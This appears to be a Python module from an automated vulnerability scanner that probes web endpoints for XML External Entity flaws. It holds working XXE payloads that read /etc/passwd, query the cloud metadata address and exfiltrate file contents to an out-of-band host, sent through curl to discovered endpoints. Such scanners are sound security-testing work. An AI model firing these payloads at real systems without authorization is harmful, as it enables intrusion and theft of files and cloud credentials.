#!/usr/bin/env python3
# modules/step23_xxe.py — XXE (XML External Entity) Detection
import os, re
from core.utils import safe_read, count_lines

class XXEStep:
    def __init__(self, p): self.p=p; self.log=p.log; self.f=p.files

    XXE_PAYLOADS = [
        # Basic XXE
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        # OOB XXE
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://OOB_HOST/xxe.dtd">%dtd;]><root/>',
        # SSRF via XXE
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        # Error-based XXE
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd "<!ENTITY &#x25; send SYSTEM \'http://OOB_HOST/?x=%file;\'>">%dtd;%send;]><root/>',
    ]

    DETECTION_KEYWORDS = ["root:x:", "daemon:", "bin:", "sys:", "ami-id"]

    def run(self):
        urls = self.f.get("urls","")
        out  = os.path.join(self.p.out, f"{self.p.prefix}_xxe.txt")
        found = 0

        if not os.path.isfile(urls):
            self.log.warn("XXE: no URLs"); return

        all_urls = safe_read(urls)

        # Find XML-accepting endpoints
        xml_endpoints = []
        for url in all_urls[:100]:
            ct_check = self.p.shell(
                f"curl -sk --connect-timeout 5 -X POST "
                f"-H 'Content-Type: application/xml' "
                f"-d '<test/>' '{url}' -o /dev/null -w '%{{http_code}}'")
            if ct_check.strip() in ("200","400","500"):
                xml_endpoints.append(url)

        self.log.info(f"XXE: {len(xml_endpoints)} XML endpoints found")

        oob_host = ""
        if self.p.oob:
            oob_host = self.p.oob.get_payload("xxe", "xxe_test").replace("http://","")

        for endpoint in xml_endpoints[:30]:
            for payload_tpl in self.XXE_PAYLOADS:
                payload = payload_tpl.replace("OOB_HOST", oob_host or "127.0.0.1")
                result  = self.p.shell(
                    f"curl -sk --connect-timeout 8 -X POST "
                    f"-H 'Content-Type: application/xml' "
                    f"-d '{payload}' '{endpoint}' 2>/dev/null")

                signals = []
                for kw in self.DETECTION_KEYWORDS:
                    if kw in result:
                        signals.append(f"keyword: {kw}")

                if "error" in result.lower() and "xml" in result.lower():
                    signals.append("XML processing error revealed")

                if signals:
                    line = f"XXE: {endpoint} | {' | '.join(signals)}"
                    with open(out,"a") as f: f.write(line+"\n")
                    self.p.add_finding("critical","XXE",endpoint,
                                       ' | '.join(signals),"xxe-engine")
                    found += 1
                    break

        self.log.success(f"XXE: {found} findings → {os.path.basename(out)}")
